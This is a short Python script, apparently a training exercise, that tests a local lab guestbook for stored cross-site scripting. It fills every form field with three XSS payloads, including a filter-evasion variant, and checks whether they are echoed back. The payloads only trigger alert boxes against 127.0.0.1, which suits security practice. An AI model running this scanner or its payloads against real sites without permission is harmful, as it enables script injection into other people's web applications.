import requests
import sys
from bs4 import BeautifulSoup, SoupStrainer

url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"
payloads = ['<script>alert(1);</script>',
'<scrscriptipt>alert(1);</scrscriptipt>', '<BODYONLOAD=alert(1)>']

initial = requests.get(url)
for payload in payloads:
	d = {}
	for field in BeautifulSoup(initial.text,parse_only=SoupStrainer('input')):
		if field.has_attr('name'):
			if field['name'].lower() == "submit":
				d[field['name']] = "submit"
			else:
				d[field['name']] = payload
	req = requests.post(url2, data=d)
	checkresult = requests.get(url3)
	if payload in checkresult.text:
		print ("Full string returned")
		print ("Attack string: "+ payload)

"""
There are three links, url is where in input field is, url2 is where
the request need to be made, and finally url3 is the response. There
are websites that use different webpages to manage requests. If the 
name has submit as the value, you should not submit javascript. I read
on the internet that it will interfer with the submit button of JS, but
I did not use any JS submit button in my code...Either the browser
does it, or that's not the real reason
""" 